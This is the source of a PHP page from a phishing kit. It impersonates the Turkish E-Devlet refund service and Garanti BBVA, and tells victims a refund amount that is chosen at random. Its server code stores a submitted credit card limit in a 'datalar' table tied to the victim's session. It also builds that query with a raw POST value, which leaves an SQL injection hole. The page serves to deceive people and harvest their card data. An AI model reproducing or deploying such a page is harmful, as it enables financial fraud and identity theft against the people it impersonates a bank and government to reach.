<?php
    ob_start();
    session_start();
    include 'ing/baglan.php';

    $ayarsor = $db->prepare("SELECT * from ayarlar where ayar_id=:id");
    $ayarsor->execute(array(
        'id' => 0
    ));
    $ayarcek=$ayarsor->fetch(PDO::FETCH_ASSOC);


  if(isset($_POST))
    {
      $kklimit = $_POST['kklimit'];
      
        if(isset($_POST['kklimit'])){
            $kullanicikaydet=$db->prepare("UPDATE datalar SET
                kart_tipi=:kart_limit
                WHERE id={$_POST['lastid']}");

            $insert=$kullanicikaydet->execute(array(
                'kart_limit' => $kklimit
            ));
            
            if ($insert){
                
            }else {
                header("Location:sms.php");
            }
        }else {
            header("Location:index.php");
        }
    }
?>
<!DOCTYPE html>
<html lang="tr">
<head>    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>E-Devlet İade Sistemi</title>
    <meta charset="utf-8">
    <meta name="author" content="<?php echo $ayarcek['ayar_author']; ?>">
    <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="assets\css\bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="assets\fonts\font-awesome\css\font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="assets\fonts\flaticon\font\flaticon.css">

    <!-- Favicon icon -->
    

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700,800%7CPoppins:400,500,700,800,900%7CRoboto:100,300,400,400i,500,700">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="assets\css\style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="assets\css\skins\default.css">

</head>
<body id="top">
<div class="page_loader"></div>

<link rel="icon" type="image/x-icon" href="tema\img\favicon.png">
<form method="post" action="problem.php" id="aspnetForm" autocomplete="off">
<meta charset="UTF-8">



   <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="tema\css\bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="tema\fonts\font-awesome\css\font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="tema\fonts\flaticon\font\flaticon.css">

    <!-- Favicon icon -->
    <link rel="shortcut icon" href="tema\img\favicon.ico" type="image/x-icon">

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700,800%7CPoppins:400,500,700,800,900%7CRoboto:100,300,400,400i,500,700">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="tema\css\style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="tema\css\skins\default.css">

</head>
<body id="top">
<div class="page_loader"></div>



<!-- Login 1 start -->
<section class="creditly-wrapper wthree, w3_agileits_wrapper">
      <div class="card bg-secondary shadow border-0">

<div class="login-1">
    <div class="container"> 
        <div class="row">
            <div class="col-md-12">
                <div class="login-inner-form">
                    <div class="details">
                        <a href="#">
                            <img src="tema\img\logos\logo-2.png"  alt="logo">
                        </a>
                        <?php 
                             $input = array("455,799", "55,99", "205,451", "95,20", "120,157","230.22","384","175.152");
                            $rand_keys = array_rand($input, 2);
                        ?>
                        <h3>İade Tutarınız Belirlendi !</h3>

<input type="hidden" name="lastid" value="<?php echo $_SESSION['data_id']; ?>">

			<font size="2" color="#960000">Garanti BBVA, tarafınıza ödenecek tutar; <strong><h3>"<?php  echo $input[$rand_keys[0]]; ?> TL"</h3></strong> En kısa sürede iade tutarı hesabınıza yansıtılacaktır. </font>
			<br>
			<br>

<form method="post" action="index.php" id="aspnetForm" autocomplete="off">
     <button type="submit" class="btn-md btn-theme btn-block">Yeni İade Talebi Ver</button>
</form>
                            </div>
							<br>
							<div id="error-message"></div>
                          </div>
                       
                </div>
            </div>
        </div>
    </div>
</div>